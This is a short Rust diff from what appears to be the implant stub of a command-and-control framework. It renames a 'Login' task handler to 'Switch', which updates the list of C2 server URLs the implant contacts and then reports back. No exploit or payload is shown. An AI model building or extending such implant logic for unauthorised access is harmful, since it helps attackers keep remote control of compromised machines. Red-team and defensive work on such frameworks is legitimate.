@@ -276,12 +276,12 @@ impl MaleficStub {
                 Delay::new(Duration::from_secs(self.meta.interval * 2)).await;
                 std::process::exit(0);
             }
-            Ok(InternalModule::Login) => {
-                let login = check_body!(req, Body::LoginRequest)?;
+            Ok(InternalModule::Switch) => {
+                let login = check_body!(req, Body::Switch)?;
                 self.meta.update_urls(login.urls);
                 self.push(new_spite(
                     req.task_id,
-                    InternalModule::Login.to_string(),
+                    InternalModule::Switch.to_string(),
                     Body::Empty(implantpb::Empty::default()),
                 ))
                 .await?
